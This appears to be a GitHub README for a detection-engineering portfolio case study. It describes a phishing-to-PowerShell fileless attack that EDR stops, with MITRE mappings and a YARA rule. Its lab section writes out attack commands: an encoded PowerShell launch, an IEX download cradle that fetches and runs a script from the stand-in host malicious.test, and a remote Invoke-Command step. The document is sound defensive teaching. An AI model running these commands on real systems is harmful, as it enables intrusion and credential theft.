# 🔐 Detection Engineering Case Study
## Phishing → PowerShell (Living off the Land) → EDR Block

**Role:** SOC Analyst / Detection Engineer
**Focus:** Living off the Land, Fileless Execution, Memory Detection
**Tools:** PowerShell, EDR, YARA, MITRE ATT&CK
**Outcome:** Attack detected and blocked before data access

----

**1. Situation**
Suspicious activity was detected on one of the administrator's workstations within the corporate network. Traditional antivirus protection failed because the attacker used legitimate system tools (PowerShell and WMI) to move undetected across the network.

**2. Task**
It was necessary to confirm the compromise, determine the scope of the breach, isolate the infected host, and prevent data leakage from the customer database.

**3. Action**
Log Analysis: Correlated events in the Splunk/ELK Stack using custom PowerShell anomalous behavior detection rules.
AI Forensics: Used the built-in AI assistant in Microsoft Sentinel to automatically build an attack graph and identify connections between remote processes.
Response: Using CrowdStrike Falcon (EDR), isolated a host from the network in one click while maintaining the ability to remotely collect artifacts.
Code Analysis: Deobfuscated a malicious PowerShell script that attempted to dump credentials from RAM (LSASS).

**4. Result**
Speed: Time to detection (MTTD) reduced to 12 minutes, time to containment (MTTR) reduced to 25 minutes.
Impact: Prevented an attempt to steal 50,000 customer records.
Improvement: Developed and implemented a new detection rule in SIEM that now blocks such command chains at the execution stage.

- ## Visualized Attack Vector: 

<img width="1536" height="1024" alt="ChatGPT Image 15 янв  2026 г , 19_44_10" src="https://github.com/user-attachments/assets/1f91e07a-db87-498f-8908-fcf9ced3de8e" />

*The diagram is constructed to demonstrate the Lateral Movement stage.*

- ## SIEM Monitoring: 

<img width="1536" height="1024" alt="ChatGPT Image 15 янв  2026 г , 19_40_22" src="https://github.com/user-attachments/assets/6c7a97c7-0add-43b1-b266-0052325ea1ea" />

*Dashboard with personal data (PII/NDA) blacked out.*

---

## 📌 Overview
This repository contains a **full SOC / Detection Engineering case study** demonstrating the detection and prevention of a **fileless Living off the Land (LOTL) attack** using **PowerShell**, **EDR telemetry**, and **YARA memory scanning**.

The goal of this project is to showcase **Detection-as-Code**, realistic attack emulation, and SOC-grade documentation suitable for a professional security portfolio.

---

## 🎯 Scenario Summary
An attacker gains initial access via **phishing email**, executes an **obfuscated PowerShell payload** on a user workstation, attempts **lateral movement** to an administrative server, and is ultimately **blocked by EDR** before reaching the target database.

**Outcome:** Attack detected and stopped at the administrative server stage.

---

## 🧠 Threat Model

| Kill Chain Stage | Description | MITRE ATT&CK |
|-----------------|-------------|--------------|
| Initial Access | Phishing Email | T1566 |
| Execution | PowerShell (EncodedCommand) | T1059.001 |
| Defense Evasion | Base64 / IEX Obfuscation | T1027 |
| Lateral Movement | PowerShell Remoting | T1021 |
| Detection | Admin Server Telemetry | — |
| Prevention | EDR Process Termination | — |

---

## 🗺️ Attack Flow Diagram

**Flow:**
```
External Attacker
   ↓ (Phishing Email)
User-PC
   ↓ (PowerShell Remote Management)
Admin-SRV  ⚡ Detection Point
   ✖ Blocked by EDR
Customer-DB
```

See: `Visualized Attack`

---

## 🧪 Attack Emulation (Lab)

> ⚠️ Performed in an isolated lab environment for educational purposes only.

### Step 1 — Initial PowerShell Execution
```powershell
powershell.exe -EncodedCommand <Base64Payload>
```

Characteristics:
- No file written to disk
- Obfuscated command execution

---

### Step 2 — Living off the Land Payload Staging
```powershell
IEX (New-Object Net.WebClient).DownloadString("http://malicious.test/payload.ps1")
```

Techniques:
- LOLBins (PowerShell)
- In-memory payload execution

---

### Step 3 — Lateral Movement Attempt
```powershell
Invoke-Command -ComputerName Admin-SRV -ScriptBlock { whoami }
```

---

## 🚨 Detection & Response

**Detection occurred on:** `Admin-SRV`

EDR detected a correlation of:
- Encoded PowerShell execution
- Network-based payload delivery
- In-memory execution patterns

**EDR Response:**
- Process terminated
- Remote session blocked
- No persistence achieved

---

## 🛡️ YARA Detection Rule

The repository includes a **YARA rule** designed to detect LOTL PowerShell attacks executed in memory.

📄 File: `detection/yara/lotl_powershell_inmemory.yar`

Detection logic combines:
- Obfuscation indicators
- LOLBins usage
- Network staging
- Reflective execution artifacts

---

## 🧩 Detection Engineering Value

This project demonstrates:
- Behavior-based detection (no hashes)
- Memory-focused threat hunting
- Mapping detections to MITRE ATT&CK
- SOC-grade documentation and workflow

---

**Automation:**

I developed a Python script for proactive threat hunting of similar threats in the future.

[View script code](scripts/threat_hunting_logic.py)

 
---

## 👤 Author
**JR.dev**  
SOC Analyst / Detection Engineering Portfolio

---

## ⚠️ Disclaimer
This project is for **educational and defensive security purposes only**. All attack simulations were conducted in a controlled lab environment.

---

## ⭐ Why This Matters
Modern attacks frequently avoid malware binaries. This case study focuses on **detecting attacker behavior**, not files — a critical skill for modern Blue Teams.

